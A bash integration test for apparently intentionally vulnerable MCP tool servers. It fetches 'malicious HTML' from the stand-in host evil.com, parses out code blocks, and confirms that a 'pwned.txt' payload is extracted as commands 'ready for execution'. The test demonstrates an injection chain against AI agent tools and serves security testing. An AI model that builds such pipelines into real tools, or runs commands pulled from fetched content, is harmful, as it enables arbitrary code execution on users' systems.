#!/bin/bash
# Integration test: Server 1 → Server 2

echo "Integration Test: Server 1 → Server 2"
echo "====================================="
echo ""

# Step 1: Fetch malicious content from Server 1
echo "Step 1: Fetching malicious HTML from Server 1..."
SERVER1_RESPONSE=$(echo '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"fetch_content","arguments":{"url":"http://evil.com/malicious"}}}' \
  | node ../01-unsafe-input-server/dist/index.js 2>/dev/null)

HTML_CONTENT=$(echo "$SERVER1_RESPONSE" | jq -r '.result.content[0].text' | jq -r '.content')

echo "✓ Received HTML (length: ${#HTML_CONTENT} chars)"
echo ""

# Step 2: Parse with Server 2
echo "Step 2: Parsing HTML with Server 2..."
PARSE_REQUEST=$(jq -n --arg content "$HTML_CONTENT" '{
  jsonrpc: "2.0",
  id: 2,
  method: "tools/call",
  params: {
    name: "parse_markdown",
    arguments: {
      content: $content
    }
  }
}')

PARSE_RESPONSE=$(echo "$PARSE_REQUEST" | node dist/index.js 2>/dev/null)
BLOCKS=$(echo "$PARSE_RESPONSE" | jq -r '.result.content[0].text' | jq -r '.blocks')

echo "✓ Extracted code blocks:"
echo "$BLOCKS" | jq -c '.[]'
echo ""

# Step 3: Extract commands
echo "Step 3: Extracting commands from blocks..."
EXTRACT_REQUEST=$(jq -n --argjson blocks "$BLOCKS" '{
  jsonrpc: "2.0",
  id: 3,
  method: "tools/call",
  params: {
    name: "extract_commands",
    arguments: {
      blocks: $blocks
    }
  }
}')

EXTRACT_RESPONSE=$(echo "$EXTRACT_REQUEST" | node dist/index.js 2>/dev/null)

echo "✓ Extracted commands:"
echo "$EXTRACT_RESPONSE" | jq -r '.result.content[0].text' | jq -c '.commands[]'
echo ""

echo "Risk Breakdown:"
echo "$EXTRACT_RESPONSE" | jq -r '.result.content[0].text' | jq '.riskBreakdown'
echo ""

# Verify payload was extracted
COMMANDS=$(echo "$EXTRACT_RESPONSE" | jq -r '.result.content[0].text' | jq -r '.commands[].code')

if echo "$COMMANDS" | grep -q "pwned.txt"; then
  echo "✓ VULNERABILITY CONFIRMED: Malicious payload successfully extracted!"
  echo "  Commands ready for execution:"
  echo "$COMMANDS" | sed 's/^/    /'
else
  echo "✗ Test failed: Payload not extracted"
  exit 1
fi

echo ""
echo "====================================="
echo "Integration test passed!"
echo "Server 1 → Server 2 chain verified"
